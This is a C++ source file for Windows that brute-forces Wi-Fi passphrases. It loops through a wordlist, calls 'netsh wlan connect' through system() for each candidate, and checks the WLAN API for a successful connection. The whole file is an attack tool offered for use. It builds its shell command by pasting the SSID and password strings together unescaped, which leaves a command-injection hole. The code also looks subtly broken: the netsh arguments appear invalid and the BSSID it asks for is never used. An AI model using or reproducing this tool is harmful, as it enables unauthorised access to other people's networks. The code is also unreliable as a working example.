#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <wlanapi.h>
#pragma comment(lib, "wlanapi.lib")

void connectToWiFi(const std::string& ssid, const std::string& password) {
    std::string command = "netsh wlan connect ssid=\"" + ssid + "\" name=\"" + ssid + "\" key=\"" + password + "\"";
    system(command.c_str());
}

bool tryPassword(const std::string& ssid, const std::string& password) {
    std::cout << "TRYING PASSPHRASE: \"" << password << "\"" << std::endl;
    connectToWiFi(ssid, password);
    Sleep(5000); // wait for 5 seconds to connect

    // Check connection status
    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;
    DWORD dwCurVersion = 0;
    DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        std::cerr << "WlanOpenHandle failed with error: " << dwResult << std::endl;
        return false;
    }

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    PWLAN_INTERFACE_INFO pIfInfo = NULL;
    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS) {
        std::cerr << "WlanEnumInterfaces failed with error: " << dwResult << std::endl;
        WlanCloseHandle(hClient, NULL);
        return false;
    }

    bool isConnected = false;
    for (int i = 0; i < (int)pIfList->dwNumberOfItems; i++) {
        pIfInfo = (WLAN_INTERFACE_INFO*)&pIfList->InterfaceInfo[i];
        if (pIfInfo->isState == wlan_interface_state_connected) {
            isConnected = true;
            break;
        }
    }

    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);

    return isConnected;
}

void dictionaryAttack(const std::string& ssid, const std::string& wordlistPath) {
    std::ifstream infile(wordlistPath);
    std::string password;
    bool keyFound = false;

    while (std::getline(infile, password)) {
        if (tryPassword(ssid, password)) {
            std::cout << "KEY FOUND: \"" << password << "\"" << std::endl;
            keyFound = true;
            break;
        }
    }

    if (!keyFound) {
        std::cout << "KEY NOT FOUND" << std::endl;
    }
}

int main() {
    std::string mode;
    std::cout << "Enter mode (MC/BF): ";
    std::cin >> mode;

    std::string ssid;
    std::cout << "ENTER SSID: ";
    std::cin >> ssid;

    if (mode == "MC") {
        std::string password;
        std::cout << "ENTER PWD: ";
        std::cin >> password;
        if (tryPassword(ssid, password)) {
            std::cout << "KEY FOUND: \"" << password << "\"" << std::endl;
        } else {
            std::cout << "KEY NOT FOUND" << std::endl;
        }
    } else if (mode == "BF") {
        std::string bssid, wordlist;
        std::cout << "ENTER BSSID: ";
        std::cin >> bssid;
        std::cout << "ENTER WORDLIST: ";
        std::cin >> wordlist;
        dictionaryAttack(ssid, wordlist);
    }

    return 0;
}
